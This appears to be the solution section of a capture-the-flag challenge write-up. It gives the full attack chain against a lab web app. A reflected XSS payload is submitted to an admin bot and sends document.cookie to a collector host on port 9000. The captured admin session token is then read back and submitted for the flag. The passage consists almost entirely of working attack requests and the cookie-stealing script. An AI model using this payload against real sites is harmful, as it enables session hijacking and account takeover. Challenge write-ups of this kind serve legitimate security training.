Full chain:

```
POST /report
Content-Type: application/json

{"url":"/?q=<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>"}
```

Wait ~2 seconds for the admin bot to visit the queued path. Then read what the
collector captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?c=session%3D<32 hex>`. That hex
value is the admin session. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex value or the
full `session=<value>` string.)
